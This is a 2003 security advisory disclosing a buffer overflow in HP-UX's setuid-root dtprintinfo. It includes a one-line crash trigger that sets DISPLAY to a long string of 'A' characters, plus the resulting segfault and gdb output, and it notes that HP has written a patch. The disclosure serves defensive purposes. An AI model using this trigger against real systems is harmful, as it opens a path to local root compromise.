=======================================================
  HPUX dtprintinfo buffer overflow vulnerability
======================================================= 

Davide Del Vecchio Adv#7 

Discovered in: 14/07/2003
Date: 08/10/2003
Tested on HP-UX B.11.00 


Description: 

The Print Viewer program provides a graphical interface that displays
the status of print queues and print jobs. 

dante@...ficino :/usr/dt/bin >ls -al /usr/dt/bin/dtprintinfo
 -r-sr-xr-x   1 root       bin         471040 Sep 22  2000 dtprintinfo 

Exporting the DISPLAY variable with a long argument... 

dante@...ficino :/usr/dt/bin >export DISPLAY="`perl -e 'printf "A" x 9777'`"
dante@...ficino :/usr/dt/bin >/usr/dt/bin/dtprintinfo
Memory fault 

 From gdb output we can see: 

Program received signal SIGSEGV, Segmentation fault.
0x7f75fb08 in memcpy () from /usr/lib/libc.2 


Solution: 

I'm in contact with HP's Security staff, especially with John Morris,
and I would like to thanks him and all his staff for the interest
demonstrated during this period of research on HP-UX.
He assured me a patch has been written and an Official Security Bullettin
will follow my advisory.

Davide Del Vecchio would like to thank all the people supporting him
and his research, his love that never leaves him alone, and obvious,
the HP-UX security staff, impersonified in this case by John Morris.
